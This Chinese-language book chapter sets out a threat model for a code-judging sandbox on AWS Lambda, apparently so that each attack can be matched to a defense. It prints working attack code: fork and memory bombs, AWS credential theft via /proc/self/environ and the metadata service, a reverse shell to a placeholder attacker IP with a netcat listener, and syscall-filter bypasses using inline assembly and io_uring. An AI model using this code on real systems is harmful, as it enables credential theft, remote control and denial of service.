# 第四章：为什么系统调用危险

> 本章通过真实的攻击代码展示：一个普通学生如果想"搞事情"，能够对代码评测系统做什么。这些不是假想的——它们都是在 Shimmy Sandbox 中经过真实测试的攻击向量。

## 4.1 威胁模型

在设计沙箱之前，必须先明确：**谁是攻击者，他们想要什么？**

**攻击者**：提交恶意代码的学生（或外部人员，如果提交端点公开可访问）。

**攻击目标**：
1. **窃取凭证**：读取 AWS 访问密钥（`AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`），可以访问整个 AWS 账户
2. **干扰其他学生**：消耗 CPU/内存/磁盘，让其他人的提交超时或崩溃
3. **数据泄露**：读取其他学生的代码提交（如果放在共享 /tmp）
4. **弹出 Shell**：在 Lambda 函数所在的环境中执行任意命令
5. **横向移动**：从 Lambda 环境攻击同一 AWS 账户的其他服务

**重要上下文**：AWS Lambda 以环境变量形式向函数传递临时 AWS 凭证（用于访问 DynamoDB、S3 等）。任何能读取 `/proc/self/environ` 的代码都能立即获取这些凭证。

## 4.2 攻击 1：Fork 炸弹（资源耗尽）

**Fork 炸弹**（fork bomb）是最简单的拒绝服务攻击：不断创建子进程，直到系统因进程表耗尽而崩溃。

```c
// fork_bomb.c
// 编译: gcc -o fork_bomb fork_bomb.c
// ⚠️ 不要在没有保护的系统上运行这个程序！

#include <unistd.h>

int main() {
    while (1) {
        fork();  // 每次调用都让进程数翻倍
    }
    // 进程数: 1 → 2 → 4 → 8 → 16 → ... → 系统崩溃
}
```

等价的 bash 版本（也是经典的演示）：
```bash
:(){ :|:& };:
```

**后果**：
- 系统进程表耗尽 → 其他程序无法 fork（包括 SSH 登录、系统服务）
- 内存耗尽 → OOM Killer 开始随机杀死进程
- 如果不加防护，可以在数秒内让整个 Lambda 函数容器失去响应

**在 Lambda 中的影响**：每个 Lambda 函数实例运行在同一个 Firecracker 微虚拟机的容器内。Fork 炸弹会耗尽该微虚拟机内的资源，影响所有并发在其上运行的函数。

## 4.3 攻击 2：内存炸弹

```c
// memory_bomb.c
// 不断分配内存直到 OOM

#include <stdlib.h>
#include <string.h>

int main() {
    size_t total = 0;
    while (1) {
        // 每次分配 1MB
        char *ptr = malloc(1024 * 1024);
        if (ptr == NULL) break;

        // 必须写入！否则 Linux 的惰性分配不实际消耗物理内存
        memset(ptr, 0xAA, 1024 * 1024);
        total += 1024 * 1024;

        // 不释放！持续增长
    }
    // total 会增长到物理内存耗尽
}
```

**Linux 的惰性内存分配**（Lazy Allocation）：`malloc()` 成功不意味着真的有物理内存——Linux 只是在虚拟地址空间做了记录（页表项），实际物理页在第一次写入时才分配（缺页中断）。这就是为什么内存炸弹必须用 `memset` 写入数据。

**后果**：
- 触发 OOM Killer（Out Of Memory Killer）：内核开始强制杀死进程以释放内存
- OOM Killer 选择的受害者可能不是恶意进程本身，而是其他无辜的进程

## 4.4 攻击 3：读取 AWS 凭证

这是最危险的攻击——后果是整个 AWS 账户被攻击者接管。

```c
// steal_credentials.c
// 读取 /proc/self/environ，提取 AWS 凭证

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    // 方法 1: 读取 /proc/self/environ
    int fd = open("/proc/self/environ", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    char buf[65536];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    buf[n] = '\0';

    // /proc/self/environ 用 '\0' 分隔每个环境变量
    // 格式: KEY=VALUE\0KEY=VALUE\0...
    char *p = buf;
    while (p < buf + n) {
        // 寻找 AWS 相关的环境变量
        if (strncmp(p, "AWS_", 4) == 0) {
            printf("发现凭证: %s\n", p);
        }
        p += strlen(p) + 1;  // 跳到下一个变量
    }

    return 0;
}
```

**预期输出**（在真实 Lambda 环境中）：
```
发现凭证: AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
发现凭证: AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
发现凭证: AWS_SESSION_TOKEN=AQoDYXdzEJr...（很长的临时 token）
发现凭证: AWS_REGION=us-east-1
```

获得这些凭证后，攻击者可以：
```bash
# 在自己的机器上使用偷来的凭证
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...
export AWS_SESSION_TOKEN=AQoDYXdzEJr...

# 列出 S3 存储桶（包含其他学生的数据？）
aws s3 ls

# 列出 Lambda 函数
aws lambda list-functions

# 访问 DynamoDB（成绩数据库？）
aws dynamodb list-tables
```

**方法 2：通过 HTTP 直接访问 AWS 元数据服务**

AWS 提供了一个特殊的 IP 地址 `169.254.169.254`（链路本地地址），Lambda 函数可以通过它获取临时凭证：

```c
// steal_via_imds.c — 通过 IMDS (Instance Metadata Service) 获取凭证

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    inet_aton("169.254.169.254", &addr.sin_addr);

    // 连接到 AWS 元数据服务
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    // 发送 HTTP 请求
    const char *req =
        "GET /latest/meta-data/iam/security-credentials/ HTTP/1.0\r\n"
        "Host: 169.254.169.254\r\n\r\n";
    write(sock, req, strlen(req));

    // 读取响应（包含角色名）
    char buf[4096];
    int n = read(sock, buf, sizeof(buf)-1);
    buf[n] = '\0';
    printf("角色名: %s\n", buf);

    close(sock);
    return 0;
}
```

## 4.5 攻击 4：反弹 Shell

**反弹 Shell**（Reverse Shell）：恶意程序主动连接到攻击者控制的服务器，把 shell 的输入输出重定向过去，让攻击者在 Lambda 环境中执行任意命令。

```c
// reverse_shell.c
// 典型的反弹 shell 实现

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define ATTACKER_IP "1.2.3.4"    // 攻击者控制的服务器
#define ATTACKER_PORT 4444

int main() {
    // 1. 创建 TCP 套接字
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    // 2. 连接到攻击者的服务器
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ATTACKER_PORT);
    inet_aton(ATTACKER_IP, &addr.sin_addr);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    // 3. 把 stdin/stdout/stderr 都重定向到这个套接字
    dup2(sock, 0);   // stdin  → 网络连接（攻击者输入）
    dup2(sock, 1);   // stdout → 网络连接（攻击者看输出）
    dup2(sock, 2);   // stderr → 网络连接

    // 4. 执行 shell（替换当前进程）
    char *argv[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", argv, NULL);

    // 攻击者现在有了一个交互式 shell！
    return 0;
}
```

**攻击者端**（使用 netcat 监听）：
```bash
# 攻击者在自己的服务器上运行
nc -lvnp 4444

# 一旦受害者连接进来：
Connection from 18.220.x.x:52341
# 攻击者现在可以在 Lambda 环境中执行任何命令
$ whoami
sbx_user1051
$ cat /proc/self/environ | tr '\0' '\n' | grep AWS
AWS_ACCESS_KEY_ID=...
```

## 4.6 攻击 5：读取其他学生的数据

如果代码评测系统在同一个 `/tmp` 目录下存放不同学生的提交，攻击者可以读取这些数据：

```c
// read_other_submissions.c

#include <stdio.h>
#include <dirent.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main() {
    // 列出 /tmp 下所有内容
    DIR *dir = opendir("/tmp");
    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;

        char path[512];
        snprintf(path, sizeof(path), "/tmp/%s", entry->d_name);
        printf("发现: %s\n", path);

        // 尝试读取内容
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char buf[1024];
            int n = read(fd, buf, sizeof(buf)-1);
            if (n > 0) {
                buf[n] = '\0';
                printf("内容: %.200s\n", buf);
            }
            close(fd);
        }
    }
    closedir(dir);
    return 0;
}
```

**Lambda 暖启动（Warm Start）问题**：Lambda 会重用函数容器（为了节省冷启动时间）。这意味着：
- 调用 1（Alice 的提交）：写入 `/tmp/result.json`
- 调用 2（Bob 的提交，复用同一个容器）：`/tmp/result.json` 还在！

这是跨调用数据泄露的经典场景。Shimmy Sandbox 的解决方案是为每次调用创建隔离的会话目录：`/tmp/dr-sandbox/<UUID>/`，调用结束后清除。

## 4.7 攻击 6：读取 /proc/self/maps 破解 ASLR

**ASLR**（Address Space Layout Randomization，地址空间布局随机化）是一种安全机制：每次程序启动时，代码和库的加载地址都随机化，使攻击者无法预测内存布局。

但 `/proc/self/maps` 泄露了完整的内存布局：

```c
// leak_aslr.c

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int fd = open("/proc/self/maps", O_RDONLY);
    char buf[16384];
    int n = read(fd, buf, sizeof(buf)-1);
    buf[n] = '\0';
    printf("%s\n", buf);
    close(fd);
    return 0;
}
```

**输出示例**：
```
555555554000-555555555000 r--p 00000000 fd:01 1234  /usr/bin/python3
555555555000-555555556000 r-xp 00001000 fd:01 1234  /usr/bin/python3
7ffff7d2a000-7ffff7d2c000 rw-p 00000000 00:00 0
7ffff7fc0000-7ffff7fc4000 r--p 00000000 00:00 0    [vvar]
7ffff7fc4000-7ffff7fc6000 r-xp 00000000 00:00 0    [vdso]
7ffff7fc6000-7ffff7fc8000 r--p 00000000 fd:01 5678 /lib/x86_64-linux-gnu/libc.so.6
7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0    [stack]
```

有了这些地址，攻击者可以构造精确的内存攻击（ROP chains、堆喷射等）。

## 4.8 攻击 7：绕过 LD_PRELOAD 的内联 syscall

这个攻击演示了为什么 LD_PRELOAD 级别的沙箱根本不够用：

```c
// bypass_sandbox.c
// 用内联汇编直接调用 syscall，完全绕过 LD_PRELOAD 拦截

#include <sys/syscall.h>
#include <fcntl.h>
#include <stdio.h>

static long raw_syscall(long nr, long a, long b, long c) {
    long ret;
    __asm__ volatile (
        "syscall"
        : "=a" (ret)
        : "0" (nr), "D" (a), "S" (b), "d" (c)
        : "rcx", "r11", "memory"
    );
    return ret;
}

int main() {
    // 直接调用 open 系统调用，绕过任何 LD_PRELOAD 钩子
    long fd = raw_syscall(SYS_open, (long)"/etc/passwd", O_RDONLY, 0);
    if (fd >= 0) {
        char buf[256];
        long n = raw_syscall(SYS_read, fd, (long)buf, sizeof(buf));
        raw_syscall(SYS_write, 1, (long)buf, n);
        raw_syscall(SYS_close, fd, 0, 0);
    }
    return 0;
}
```

**这个程序即使在有 LD_PRELOAD 沙箱的情况下也能正常读取 /etc/passwd**，因为它完全没有调用 glibc 的 `open()` 函数。

## 4.9 攻击 8：io_uring 异步 I/O 绕过

**`io_uring`** 是 Linux 5.1 引入的异步 I/O 机制，允许程序把 I/O 请求批量提交到一个环形缓冲区（ring buffer），内核异步执行，无需每次都陷入内核。

```c
// io_uring_bypass.c
// io_uring 允许提交系统调用请求而不触发 pre_syscall 钩子

#include <liburing.h>
#include <fcntl.h>
#include <stdio.h>

int main() {
    struct io_uring ring;

    // 1. 初始化 io_uring（这一步 DynamoRIO 可以拦截）
    io_uring_queue_init(32, &ring, 0);

    // 2. 准备一个 openat 操作（加入队列，但还没执行）
    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    io_uring_prep_openat(sqe, AT_FDCWD, "/etc/passwd", O_RDONLY, 0);

    // 3. 提交请求到内核
    // ⚠️ 关键：这里不触发 openat 系统调用！
    // 内核通过共享内存看到请求，直接在内核线程中执行
    // DynamoRIO 的 pre_syscall 钩子永远不会为这个 openat 触发！
    io_uring_submit(&ring);

    // 4. 等待完成
    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(&ring, &cqe);

    int fd = cqe->res;  // 拿到文件描述符！
    printf("fd = %d\n", fd);

    io_uring_queue_exit(&ring);
    return 0;
}
```

**io_uring 的工作原理**：

```
普通系统调用（可拦截）:
  用户代码 → syscall 指令 → CPU 陷入 Ring 0
              ↑ DynamoRIO 在这里拦截！

io_uring（绕过拦截）:
  用户代码 → 向共享内存环形缓冲区写入请求
                    ↓
             内核 io_uring 工作线程直接读取请求
             内核执行 openat() 等操作
                    ↓（完成写入结果环）
  用户代码 → 从完成队列读取结果
  // 整个过程没有 syscall 指令！DynamoRIO 看不见！
```

Shimmy Sandbox 的解决方案：直接阻断 `io_uring_setup()` 这个初始化调用（这是唯一需要用 `syscall` 指令的步骤），使整个 io_uring 机制无法初始化。

## 4.10 攻击 9：CPU 时间劫持

```c
// cpu_spin.c
// 死循环消耗 CPU，让其他提交的评测超时

int main() {
    // 无限循环，不调用任何系统调用
    // 即使 DynamoRIO 在，这段代码也会正常执行（不含任何 syscall）
    while (1) {
        // 也可以做"有用"的工作来逃避检测
        volatile int x = 0;
        for (int i = 0; i < 1000000; i++) x += i;
    }
}
```

这个攻击不需要任何系统调用，因此无法通过系统调用过滤阻断。必须依靠 `RLIMIT_CPU`（CPU 时间资源限制）来终止它。

## 4.11 攻击 10：文件描述符耗尽

```c
// fd_exhaust.c
// 打开大量文件描述符，让其他代码无法打开文件

#include <fcntl.h>
#include <stdio.h>

int main() {
    for (int i = 0; i < 100000; i++) {
        int fd = open("/dev/null", O_RDONLY);
        if (fd < 0) {
            printf("fd 耗尽于 i=%d\n", i);
            break;
        }
        // 故意不关闭！
    }
    // 进程退出时内核会清理，但在此期间其他进程无法获取 fd
    sleep(3600);  // 保持进程运行 1 小时
}
```

## 4.12 攻击总结：26 种真实攻击向量

Shimmy Sandbox 在测试中验证了以下 26 种攻击类型的防御：

```
资源耗尽类:
├── CPU 死循环（RLIMIT_CPU）
├── 内存炸弹（RLIMIT_AS）
├── Fork 炸弹（RLIMIT_NPROC）
├── 文件描述符耗尽（RLIMIT_NOFILE）
├── 磁盘写爆（RLIMIT_FSIZE）
└── 线程洪水（RLIMIT_NPROC）

凭证窃取类:
├── 读 /proc/self/environ（AWS 密钥）
├── 读 /etc/passwd（用户信息）
├── 读 /etc/shadow（密码哈希）
├── 读 ~/.ssh/id_rsa（SSH 私钥）
├── 读 /proc/self/maps（内存布局）
└── HTTP 访问 169.254.169.254（IMDS）

进程逃逸类:
├── execve/shell 弹出
├── fork + execve 弹出
├── 进程后台化（daemonize）
└── 进程组逃逸（setsid）

网络攻击类:
├── TCP 连接到外部 IP
├── TCP 连接到 169.254.169.254
├── DNS 数据外泄
└── UDP 数据外泄

高级绕过类:
├── 内联汇编 syscall（绕过 LD_PRELOAD）
├── 静态链接二进制（绕过 LD_PRELOAD）
├── io_uring 异步 I/O（绕过 pre_syscall 钩子）
├── mmap(PROT_EXEC) + JIT 生成 syscall
└── 路径遍历（../../../etc/passwd）
```

每一种攻击都对应 Shimmy Sandbox 的一个防御机制。接下来的章节将详细讲解这些防御是如何实现的。

## 小结

本章用具体代码展示了学生代码可能发起的真实攻击。关键洞察：

1. **最高价值目标是 AWS 凭证**：读取 `/proc/self/environ` 即可，无需任何高级技术
2. **LD_PRELOAD 沙箱形同虚设**：内联汇编一行代码就能绕过
3. **io_uring 是系统调用过滤的盲点**：必须在初始化阶段阻断
4. **Lambda 暖启动带来跨调用泄露风险**：必须做到每次调用隔离
5. **资源耗尽攻击不依赖系统调用过滤**：必须配合 rlimits

没有任何单一机制能防御所有这些攻击。Shimmy Sandbox 采用分层防御策略——这是第十章的主题。下一章先看看传统的沙箱技术为什么在这个场景中都遇到了问题。
